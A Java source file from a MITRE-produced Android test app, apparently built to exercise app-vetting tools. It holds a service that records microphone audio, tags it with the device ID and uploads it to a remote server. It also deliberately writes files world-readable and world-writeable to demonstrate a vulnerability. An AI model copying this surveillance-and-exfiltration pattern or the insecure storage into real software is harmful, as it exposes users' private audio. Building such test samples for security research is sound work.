/*
 * Copyright 2017 The MITRE Corporation
 * Approved for Public Release; Distribution Unlimited. Case Number 17-0137.
 
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.

 * NOTICE
 * This software was produced for the U.S. Government under Basic Contract
 * No. W15P7T-13-C-A802, and is subject to the Rights in Noncommercial
 * Computer Software and Noncommercial Computer Software Documentation
 * Clause 252.227-7014 (FEB 2012)
 */

// This class activates the microphone for a set number of seconds, then uploads the audio
// to a remote server.

package com.example.uploaddataapp;

import android.Manifest;
import android.app.IntentService;
import android.content.Intent;
import android.media.MediaRecorder;
import android.provider.Settings;
import android.util.Log;

import java.io.FileNotFoundException;
import java.io.IOException;

import pub.devrel.easypermissions.EasyPermissions;

public class RecordIntentService extends IntentService {

	public RecordIntentService() {
		super("RecordIntentService");
		// TODO Auto-generated constructor stub
	}

	@Override
	protected void onHandleIntent(Intent intent) {
		int duration = intent.getIntExtra("duration", 5000); // Default to 5 seconds
		startRecording(duration);
		
	}

	protected synchronized void startRecording(int duration) {
		try {
			String arch = System.getProperty("os.arch");
			Log.d("RecordIntentService", "arch: " + arch);
			if (arch.equals("i686")) {
				return; // running in Android-x86 VM, microphone not available.
			}
			// May need to add code to handle case where there is no microphone
			String perms[] = { Manifest.permission.RECORD_AUDIO };
			if (EasyPermissions.hasPermissions(this, perms)) {
				MediaRecorder mRecorder = new MediaRecorder();
				mRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
				mRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
				String fileName = System.currentTimeMillis() + ".3gp";

				// Demonstrate vulnerable file storage (world-readable and world-writeable file permissions)
				mRecorder.setOutputFile(openFileOutput(fileName, MODE_WORLD_READABLE|MODE_WORLD_WRITEABLE).getFD());

				mRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
				mRecorder.prepare();
				mRecorder.start();
				wait(duration); // Make this configurable through the Intent or another way
				mRecorder.stop();
				mRecorder.reset();
				mRecorder.release();
				SendIntentService.sendFile("audio_" + Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID),
						openFileInput(fileName));
			} else {
				Log.d("RecordIntentService", "Does not hold permission RECORD_AUDIO");
			}

		} catch (IllegalStateException e1) {
			e1.printStackTrace();
		} catch (FileNotFoundException e1) {
			e1.printStackTrace();
		} catch (IOException e1) {
			e1.printStackTrace();
		} catch (InterruptedException e1) {
			e1.printStackTrace();
		}
	}
}
